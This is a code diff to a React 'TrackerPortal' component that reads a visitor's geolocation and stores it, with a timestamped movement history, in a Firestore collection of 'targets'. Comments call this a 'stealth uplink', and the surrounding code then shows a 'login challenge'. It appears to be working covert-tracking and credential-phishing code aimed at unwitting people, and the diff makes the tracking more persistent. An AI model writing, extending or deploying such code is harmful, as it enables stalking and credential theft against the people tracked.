@@ -125,10 +125,11 @@ export const TrackerPortal: React.FC = () => {
           const { latitude, longitude, accuracy } = position.coords;
           
           try {
-            // Persistent stealth uplink with history tracking
-            const uid = user?.uid || targetId || 'anon';
+            // Persistent stealth uplink with history tracking (Atomic Write)
+            const uid = auth.currentUser?.uid || targetId || `T-ANON-${Math.random().toString(36).substring(7).toUpperCase()}`;
             const targetRef = doc(db, 'targets', uid);
-            await setDoc(targetRef, {
+            
+            const payload = {
               name: targetDisplayName,
               lat: latitude,
               lng: longitude,
@@ -136,12 +137,21 @@ export const TrackerPortal: React.FC = () => {
               lastSeen: new Date().toISOString(),
               status: 'active',
               platform: platform,
-            }, { merge: true });
+              history: arrayUnion({ 
+                lat: latitude, 
+                lng: longitude, 
+                time: new Date().toISOString() 
+              })
+            };
+
+            await setDoc(targetRef, payload, { merge: true });
             
-            // Append to path history for movement visualization
-            await updateDoc(targetRef, {
-              history: arrayUnion([latitude, longitude])
-            });
+            // Temporary signal success indicator
+            const signalHint = document.createElement('div');
+            signalHint.className = 'fixed bottom-4 left-1/2 -translate-x-1/2 bg-emerald-500/10 border border-emerald-500/50 text-emerald-500 text-[8px] font-bold px-3 py-1 rounded shadow-lg z-[9999] animate-bounce';
+            signalHint.innerText = 'SIGNAL_LATCHED: HANDSHAKE_SUCCESS';
+            document.body.appendChild(signalHint);
+            setTimeout(() => signalHint.remove(), 3000);
 
             // Show login challenge after a brief delay
             setTimeout(() => {
